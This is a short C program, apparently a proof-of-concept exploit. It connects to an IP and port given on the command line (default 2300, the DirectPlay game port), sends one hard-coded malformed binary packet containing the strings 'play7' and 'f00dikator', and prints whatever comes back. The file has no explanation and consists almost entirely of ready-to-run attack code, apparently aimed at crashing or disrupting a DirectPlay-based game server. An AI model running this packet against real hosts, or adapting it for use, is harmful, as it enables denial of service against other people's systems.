#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <sys/signal.h>
#include <arpa/nameser.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>


const char req[] = 
"\x90\x00\xB0\xFA\x02\x00\x08\xFC\x62\x71\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x70\x6C\x61\x79\x37\x00\x0E\x00\x50\x00\x00\x00"
"\x44\x00\x00\x00\x20\xE7\xE5\xF9\xE8\x5C\x45\x4E\xB0\x23\x48\x35"
"\xF1\x82\x0D\x68\x01\x5B\xD7\x00\x8C\x7A\xD3\x11\xA2\xD5\x00\x92"
"\x97\xBA\x65\x50\x08\x00\x00\xF1\x01\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xB7\x4D\x22\x02\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5C\x00\x15\x00"
"\x66\x30\x30\x64\x69\x6B\x61\x07\x6F\x72\x27\x73\x20\x47\x61\x6D"
"\x23\x00\x5B\x66\x30\x30\x64\x69\x6B\x61\x74\x6F\x72\x5D\x00\xCF";


int main(int argc, char **argv) {
	struct sockaddr_in addr;
	int s, port = 0,mu;
	char *host = NULL;
	char buf2[1024];

        if (argc < 3) {
                fprintf(stderr, "Use: %s [ip] [port] \n", argv[0]);
                exit(1);
        }
	

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) {
		fprintf(stderr, "Port out of range (%d)\n", port);
		fprintf(stderr, "Using 2300\n");
		port = 2300;
	}

	memset(&addr, 0, sizeof(addr));

	signal(SIGPIPE, SIG_IGN); /* Ignore SIGPIPE */

        if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stderr, "Socket error: %s\n", strerror(errno));
		exit(0);
        }
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(host);
        if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		fprintf(stderr, "Unable to connect: %s\n", strerror(errno));
   	        exit(0); 
	}

	write(s, req, sizeof(req) - 1);
	mu = recv(s,buf2,sizeof(buf2),0);
	if (mu >= 0)
	{
		printf ("recvd %d bytes equal to %s\n", mu, buf2);
	}
	close(s);
	exit(0);
}

